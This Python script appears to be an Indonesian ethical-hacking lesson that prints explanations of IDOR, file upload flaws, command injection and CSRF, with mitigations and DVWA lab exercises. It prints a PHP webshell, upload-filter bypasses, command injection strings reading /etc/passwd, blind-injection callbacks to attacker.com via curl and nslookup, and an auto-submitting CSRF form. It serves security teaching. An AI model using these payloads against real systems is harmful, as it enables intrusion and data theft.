#!/usr/bin/env python3
"""Sesi 16: IDOR, Upload, & Command Injection"""

import subprocess
import sys
import os
from datetime import datetime


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 16")
    print("  IDOR, File Upload, & Command Injection")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name):
    try:
        subprocess.check_output([name, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        try:
            subprocess.check_output(["which", name], stderr=subprocess.STDOUT, timeout=5)
            return "✅ TERINSTAL"
        except (subprocess.CalledProcessError, FileNotFoundError, OSError):
            return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── [1] IDOR Concept ──
def idor_concept():
    print("  💡 IDOR — Insecure Direct Object Reference:\n")

    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║  🔑 KUNCI KAMAR ORANG                                ║
   ║     Bayangkan: Kamu di hotel dikasih kunci kamar 101.║
   ║     Tapi kamu coba-coba buka kamar 102 pake kunci    ║
   ║     kamu — dan BERHASIL! Padahal itu bukan kamarmu!  ║
   ║                                                        ║
   ║     IDOR = Kamu bisa akses data orang lain cuma       ║
   ║     dengan mengubah ID di URL/parameter.              ║
   ╚═══════════════════════════════════════════════════════╝

  Contoh URL rentan:
    https://bank.com/transfer?from=123&to=456&amount=1000000
    https://shop.com/profile?id=5   → ubah jadi id=6, lihat profil orang!
    https://api.com/user/1001/invoice → ubah 1001 jadi 1002, invoice orang lain!
    """)

    print("  Demo IDOR — Parameter Tampering:\n")

    print(f"  {'URL Asli':<55} {'Aksi':<30}")
    print(f"  {'─' * 85}")
    idor_examples = [
        ("https://shop.com/order?id=ORD-1001",  "Lihat pesanan sendiri"),
        ("https://shop.com/order?id=ORD-1002",  "🔴 Lihat pesanan ORANG LAIN (IDOR!)"),
        ("https://api.com/user/500/profile",    "Profil user 500"),
        ("https://api.com/user/501/profile",    "🔴 Profil user 501 (IDOR!)"),
        ("/download.php?file=report_2024.pdf",  "Download file sendiri"),
        ("/download.php?file=../../private/payroll.csv", "🔴 Path traversal + IDOR!"),
    ]
    for url, aksi in idor_examples:
        print(f"  {url:<55} {aksi:<30}")
    print()

    print("  💡 Cara mendeteksi IDOR:\n")
    print("     👉 Cari parameter numeric: ?id=, ?user=, ?uid=, ?pid=")
    print("     👉 Cari UUID yang bisa ditebak: ?token=abc-123-def")
    print("     👉 Coba increment/decrement parameter")
    print("     👉 Cek response: apakah data milik user lain muncul?")
    print()

    print("  🔥 IDOR bisa lebih berbahaya:\n")
    print(f"  {'Endpoint':<40} {'Parameter':<20} {'Dampak':<35}")
    print(f"  {'─' * 95}")
    idor_danger = [
        ("PUT /api/user/5/role",       "role=admin",    "Privilege Escalation!"),
        ("DELETE /api/invoice/201",    "-",             "Hapus data orang lain"),
        ("POST /api/reset-password",   "user_id=1002",  "Reset password orang lain"),
        ("GET /api/patient/50/records","-",             "Data medis rahasia bocor"),
    ]
    for endpoint, param, dampak in idor_danger:
        print(f"  {endpoint:<40} {param:<20} {dampak:<35}")
    print()


# ── [2] File Upload Vulnerability ──
def upload_concept():
    print("  💡 FILE UPLOAD VULNERABILITY:\n")

    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║  📦 TITIP PAKET                                     ║
   ║     Bayangkan: Kamu titip paket di resepsionis.     ║
   ║     Tapi resepsionis gak ngecek isi paketnya.       ║
   ║     Kamu bisa titip bom (webshell) di dalamnya!     ║
   ║                                                        ║
   ║     File Upload Vuln = Server tidak memvalidasi      ║
   ║     file yang diupload user.                         ║
   ╚═══════════════════════════════════════════════════════╝

  🔥 Dampak:
    • Upload webshell (.php, .asp, .jsp) → RCE
    • Upload malware → infect server & visitor
    • Upload file besar → Denial of Service (disk full)
    • Upload SVG dengan XSS → stored XSS
    """)

    print("  Demo — Jenis file berbahaya:\n")

    print(f"  {'Ekstensi':<20} {'Jenis File':<30} {'Bahaya':<35}")
    print(f"  {'─' * 85}")
    upload_types = [
        (".php / .phtml",  "Web PHP",            "Webshell -> RCE langsung"),
        (".php5 / .php7",  "Web PHP (varian)",   "Bypass ekstensi filter"),
        (".asp / .aspx",   "Web ASP.NET",        "RCE di server Windows"),
        (".jsp",           "Java Server Page",   "RCE di server Java"),
        (".cgi / .pl",     "CGI / Perl script",  "RCE via CGI"),
        (".war",           "Web Archive",        "Deploy aplikasi Java utuh"),
        (".svg",           "Scalable Vector",    "Stored XSS via SVG"),
        (".htaccess",      "Apache config",      "Override server config"),
        (".py",            "Python script",      "RCE jika dieksekusi"),
        (".exe / .jar",    "Executable",         "Malware di server"),
    ]
    for ext, jenis, bahaya in upload_types:
        print(f"  {ext:<20} {jenis:<30} {bahaya:<35}")
    print()

    print("  💡 WebShell Concept:\n")
    print("""    <!-- Simple PHP WebShell -->
    <?php
      if (isset($_GET['cmd'])) {
        echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
      }
    ?>
    """)
    print("  🔥 Setelah upload, akses: http://target.com/uploads/shell.php?cmd=id")
    print("     Langsung RCE! Bisa lanjut: cat /etc/passwd, ls -la, whoami\n")

    print("  💡 Bypass Upload Filter:\n")
    print(f"  {'Teknik':<30} {'Cara':<50} {'Contoh':<30}")
    print(f"  {'─' * 110}")
    bypass_tech = [
        ("Double extension",   "Tambahkan ekstensi valid di belakang",    "shell.php.jpg"),
        ("Case manipulation",  "Ubah case huruf",                         "shell.PhP, shell.ASP"),
        ("Null byte injection","Tambah %00 di nama file",                "shell.php%00.jpg"),
        ("Content-type spoof", "Ubah Content-Type header",               "image/jpeg"),
        ("Magic byte spoof",   "Tambah byte signature gambar di depan",   "GIF89a; <?php ..."),
        ("Ekstensi alternatif","Gunakan varian ekstensi",                 ".phtml, .php5, .shtml"),
    ]
    for teknik, cara, contoh in bypass_tech:
        print(f"  {teknik:<30} {cara:<50} {contoh:<30}")
    print()


# ── [3] Command Injection ──
def cmdi_concept():
    print("  💡 COMMAND INJECTION:\n")

    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║  Command Injection = Attacker menyuntikkan OS command ║
  ║  ke aplikasi yang menjalankan system command.        ║
  ║                                                        ║
  ║  Contoh fitur rentan:                                 ║
  ║    • Tool ping/traceroute dari web                    ║
  ║    • DNS lookup                                       ║
  ║    • Convert file (PDF→image)                         ║
  ║    • Export data (csv, pdf, backup)                   ║
  ╚═══════════════════════════════════════════════════════╝

  Operator injeksi:
    ;  (semicolon)   → command1; command2
    && (AND)         → command1 && command2 (jalan kalo 1 sukses)
    || (OR)          → command1 || command2 (jalan kalo 1 gagal)
    |  (pipe)        → command1 | command2 (pipe output)
    `  (backtick)    → `command` (command substitution)
    $() (subshell)   → $(command) (command substitution)
    """)

    print("  Demo Command Injection:\n")

    print(f"  {'Normal Input':<30} {'→ Output':<40}")
    print(f"  {'─' * 70}")
    print(f"  {'ping 8.8.8.8':<30} {'→ Pinging 8.8.8.8 ...':<40}")
    print(f"  {'ping 8.8.8.8; whoami':<30} {'→ Pinging 8.8.8.8 ... + [www-data]':<40}")
    print(f"  {'ping 8.8.8.8 && id':<30}  {'→ Pinging 8.8.8.8 ... + uid=33(www-data)':<40}")
    print(f"  {'8.8.8.8 | cat /etc/passwd':<30} {'→ Bocor semua user!':<40}")
    print()

    print("  💡 Blind Command Injection:\n")
    print("   Jika output tidak langsung terlihat, gunakan:\n")
    print(f"  {'Metode':<25} {'Payload':<50} {'Cek Hasil':<30}")
    print(f"  {'─' * 105}")
    blind_tech = [
        ("Time-based",  "; sleep 5",                  "Cek delay 5 detik"),
        ("DNS exfil",   "; nslookup attacker.com",     "Cek DNS log server"),
        ("Outbound",    "; curl http://attacker.com/",  "Cek HTTP request log"),
        ("Write file",  "; echo hacked > /tmp/ok.txt", "Cek apakah file terbuat"),
    ]
    for metode, payload, cek in blind_tech:
        print(f"  {metode:<25} {payload:<50} {cek:<30}")
    print()


# ── [4] CSRF Concept ──
def csrf_concept():
    print("  💡 CSRF — Cross-Site Request Forgery:\n")

    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║  CSRF = Attacker membuat request palsu atas nama     ║
  ║  user yang sudah login.                              ║
  ║                                                        ║
  ║  Contoh:                                              ║
  ║  1. User login ke bank.com (dapet session cookie)    ║
  ║  2. User buka attacker.com (tab baru)                ║
  ║  3. attacker.com punya <form action=\"bank.com/transfer\">║
  ║  4. Form auto-submit via JS → transfer uang!         ║
  ║  5. Cookie dikirim otomatis browser → request valid! ║
  ╚═══════════════════════════════════════════════════════╝
    """)

    print("  Contoh HTML exploit CSRF:\n")
    print("""    <html>
    <body>
      <h1>Klik untuk lihat kucing lucu!</h1>
      <img src="https://bank.com/transfer?to=attacker&amount=1000000" width="1" height="1">
      <form action="https://bank.com/transfer" method="POST" id="csrfform">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="1000000">
        <input type="submit" value="Klik aku!">
      </form>
      <script>document.getElementById('csrfform').submit();</script>
    </body>
    </html>
    """)

    print("  ✅ Mitigasi CSRF:\n")
    print(f"  {'Mitigasi':<30} {'Penjelasan':<55} {'Efektivitas':<20}")
    print(f"  {'─' * 105}")
    mitigasi = [
        ("CSRF Token",        "Token unik per form, divalidasi server",     "✅ Standar industri"),
        ("SameSite Cookie",   "Cookie gak dikirim request cross-origin",   "✅ Sangat efektif"),
        ("Double Submit",     "Cookie + request header harus cocok",        "✅ Efektif"),
        ("Custom Header",     "Request harus punya header X-Requested-With","✅ Efektif"),
        ("Captcha",           "Konfirmasi aksi sensitif dengan captcha",   "✅ Untuk aksi penting"),
    ]
    for mit, penjelasan, efektif in mitigasi:
        print(f"  {mit:<30} {penjelasan:<55} {efektif:<20}")
    print()


# ── [5] Prevention ──
def prevention():
    print("  💡 PENCEGAHAN LENGKAP:\n")

    print(f"  {'Kerentanan':<25} {'Pencegahan Utama':<45} {'Tips Tambahan':<35}")
    print(f"  {'─' * 105}")
    prevs = [
        ("IDOR",              "Gunakan UUID/acak, bukan ID berurutan",         "Validasi ownership di backend"),
        ("IDOR",              "Cek authorization di setiap endpoint",          "Jangan percaya input user"),
        ("File Upload",       "Validasi ekstensi + content-type + magic byte", "Simpan file di luar webroot"),
        ("File Upload",       "Rename file + batasi ukuran",                  "Scan file dengan antivirus"),
        ("Command Injection", "Gunakan library bawaan (tidak via shell)",      "Escapeshellarg/escapeshellcmd"),
        ("Command Injection", "Whitelist command dan argumen yang diizinkan",  "Jangan pakai system()/exec()"),
        ("CSRF",              "CSRF token + SameSite cookie",                  "Konfirmasi aksi sensitif"),
    ]
    for kerentanan, utama, tips in prevs:
        print(f"  {kerentanan:<25} {utama:<45} {tips:<35}")
    print()


# ── [6] Tool Check ──
def tool_check():
    print("  💡 TOOLS CHECK:\n")

    tools = [
        ("Burp Suite",   "Proxy + repeater untuk IDOR testing"),
        ("curl",         "Manual HTTP requests"),
        ("wfuzz",        "Fuzzing parameter IDOR"),
        ("gobuster",     "Directory brute force"),
        ("nikto",        "Web vulnerability scanner"),
    ]

    print(f"  {'Tool':<20} {'Fungsi':<40} {'Status':<20}")
    print(f"  {'─' * 80}")
    for tool_name, fungsi in tools:
        status = check_tool(tool_name)
        print(f"  {tool_name:<20} {fungsi:<40} {status:<20}")
    print()


# ── [7] Analogi ──
def analogi():
    print("""
   ╔══════════════════════════════════════════════════════════╗
   ║   📝 ANALOGI LENGKAP                                    ║
   ║                                                        ║
   ║   IDOR = KUNCI KAMAR ORANG                             ║
   ║     Kamu punya kunci kamar 101, tapi coba-coba         ║
   ║     buka kamar 102 — dan berhasil!                     ║
   ║                                                        ║
   ║   File Upload = TITIP PAKET                            ║
   ║     Kamu titip paket di resepsionis. Resepsionis       ║
   ║     gak ngecek isi — kamu bisa titip BOM (webshell)!   ║
   ║                                                        ║
   ║   Command Injection = NYURUH PAK SURAH                 ║
   ║     Kamu minta tolong Pak Surah ngetik surat,          ║
   ║     tapi kamu nyelipin perintah di sela-sela.          ║
   ║                                                        ║
   ║   CSRF = SURAT PALSU ATAS NAMA ORANG                   ║
   ║     Orang jahat bikin surat palsu pake tanda tangan    ║
   ║     kamu (tanpa sepengetahuan kamu).                   ║
   ╚══════════════════════════════════════════════════════════╝
    """)


def main():
    banner()

    # ── [1] IDOR ──
    section(1, "INSECURE DIRECT OBJECT REFERENCE (IDOR)")
    idor_concept()

    # ── [2] File Upload ──
    section(2, "FILE UPLOAD VULNERABILITY")
    upload_concept()

    # ── [3] Command Injection ──
    section(3, "COMMAND INJECTION")
    cmdi_concept()

    # ── [4] CSRF ──
    section(4, "CROSS-SITE REQUEST FORGERY (CSRF)")
    csrf_concept()

    # ── [5] Prevention ──
    section(5, "PENCEGAHAN LENGKAP")
    prevention()

    # ── [6] Tool Check ──
    section(6, "TOOLS CHECK")
    tool_check()

    # ── [7] Analogi ──
    section(7, "ANALOGI LENGKAP")
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 16 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • IDOR: Akses data orang lain dengan mengubah ID parameter")
    print("    • File Upload: Upload webshell jika server tidak validasi file")
    print("    • Command Injection: Suntik OS command ke fungsi system()")
    print("    • CSRF: Request palsu atas nama user yang sudah login")
    print("    • Bypass Upload: Double ext, null byte, magic byte spoof")
    print("    • Blind CMDI: Time-based, DNS exfil, outbound HTTP")
    print("    • Mitigasi: UUID, validasi upload, prepared cmd, CSRF token")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Tes IDOR di DVWA: ubah ?id=1 jadi ?id=2,3,4")
    print("    2. Upload webshell di DVWA: shell.php → cmd=id")
    print("    3. Coba command injection: ; whoami && ls || echo test")
    print("    4. Tes blind command injection: ; sleep 5")
    print("    5. Cek Burp Suite untuk IDOR testing (Repeater)")
    print("    6. Coba bypass upload: double ext, magic byte GIF89a")
    print("    7. Buat HTML form CSRF dan tes di lab sendiri")
    print("    8. Cek SameSite cookie di browser DevTools")
    print("    9. Baca OWASP IDOR, File Upload, CMDI prevention cheat sheet")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
